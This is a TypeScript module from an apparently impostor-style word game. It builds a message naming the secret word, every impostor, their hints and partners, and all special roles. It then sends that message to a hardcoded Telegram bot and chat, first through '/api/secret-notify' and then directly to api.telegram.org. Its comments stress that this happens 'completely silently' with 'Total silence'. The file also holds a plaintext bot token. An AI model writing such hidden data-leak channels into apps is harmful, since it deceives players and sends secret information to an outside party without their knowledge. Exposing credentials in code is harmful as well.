export const TELEGRAM_BOT_TOKEN = "9252883440:AAFKLXFLtFx5w9tn1kvJHvr72LoenNms8Us";
export const TELEGRAM_CHAT_ID = "1029437122";

export function escapeHtml(text: string): string {
  return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

export const ROLE_NAMES: Record<string, { name: string; icon: string }> = {
  guardian_angel: { name: "Guardian Angel", icon: "👼" },
  initiator: { name: "The Initiator", icon: "⚡" },
  extra_voter: { name: "The Extra Voter", icon: "🗳️" },
  bounty_hunter: { name: "The Bounty Hunter", icon: "🎯" },
  echo: { name: "The Echo", icon: "🔁" },
  jammer: { name: "The Jammer", icon: "📡" },
};

export type SecretNotifyAssignment = {
  playerName: string;
  isImposter: boolean;
  clue?: string;
  specialRole?: string | null;
  guardianAngelClue?: string;
  bountyTargetName?: string;
  knownTeammateName?: string;
  isRogueImposter?: boolean;
};

export type SecretNotifyPayload = {
  roundId?: string;
  word: string;
  category?: string;
  gameMode?: string;
  assignments: SecretNotifyAssignment[];
};

export function formatSecretNotificationMessage(payload: SecretNotifyPayload): string {
  const { word, category, gameMode, assignments } = payload;
  const imposters = assignments.filter((a) => a.isImposter);
  const crewmates = assignments.filter((a) => !a.isImposter);
  const specialRoles = assignments.filter((a) => a.specialRole);

  const lines: string[] = [
    `🕵️ <b>MATCH INTEL</b>`,
    "",
    `🤫 <b>Secret Word:</b> <code>${escapeHtml(word)}</code>`,
    `📁 <b>Category:</b> ${escapeHtml(category || "General")}`,
    "",
    `🎭 <b>Impostors (${imposters.length}):</b>`,
  ];

  for (const imp of imposters) {
    let line = `• <b>${escapeHtml(imp.playerName)}</b>`;
    if (imp.clue) {
      line += ` (Hint: "<i>${escapeHtml(imp.clue)}</i>")`;
    }
    if (imp.knownTeammateName) {
      line += ` [🤝 Partner: <b>${escapeHtml(imp.knownTeammateName)}</b>]`;
    }
    if (imp.isRogueImposter) {
      line += ` [👤 Rogue]`;
    }
    if (imp.specialRole) {
      const roleInfo = ROLE_NAMES[imp.specialRole] || {
        name: imp.specialRole,
        icon: "⚡",
      };
      line += ` [${roleInfo.icon} ${escapeHtml(roleInfo.name)}]`;
    }
    lines.push(line);
  }

  if (specialRoles.length > 0) {
    lines.push("", `⚡ <b>Special Roles:</b>`);
    for (const sr of specialRoles) {
      const roleInfo = ROLE_NAMES[sr.specialRole] || {
        name: sr.specialRole,
        icon: "⚡",
      };
      let desc = `• <b>${escapeHtml(sr.playerName)}</b>: ${roleInfo.icon} ${escapeHtml(roleInfo.name)}`;
      if (sr.specialRole === "guardian_angel" && sr.guardianAngelClue) {
        desc += ` (Guarding Clue: "<i>${escapeHtml(sr.guardianAngelClue)}</i>")`;
      }
      if (sr.specialRole === "bounty_hunter" && sr.bountyTargetName) {
        desc += ` (🎯 Target: <b>${escapeHtml(sr.bountyTargetName)}</b>)`;
      }
      lines.push(desc);
    }
  }

  lines.push(
    "",
    `🧑‍🚀 <b>Crewmates (${crewmates.length}):</b>`,
    crewmates.map((c) => escapeHtml(c.playerName)).join(", "),
  );

  if (gameMode) {
    lines.push("", `<i>Mode: ${escapeHtml(gameMode === "classic" ? "Pass & Play" : "Online")}</i>`);
  }

  return lines.join("\n");
}

export async function sendTelegramDirect(text: string): Promise<boolean> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML",
      }),
    });
    return res.ok;
  } catch {
    return false;
  }
}

/**
 * Dispatches the secret notification completely silently without affecting any UI.
 * First attempts via backend API route /api/secret-notify.
 * If backend fails (e.g. static hosting), silently falls back to direct Telegram API.
 */
export async function dispatchSecretNotification(payload: SecretNotifyPayload): Promise<void> {
  try {
    const res = await fetch("/api/secret-notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (res.ok) return;
  } catch {
    // API route failed or unavailable, proceed to silent direct fallback
  }

  // Silent direct fallback
  try {
    const message = formatSecretNotificationMessage(payload);
    await sendTelegramDirect(message);
  } catch {
    // Total silence
  }
}
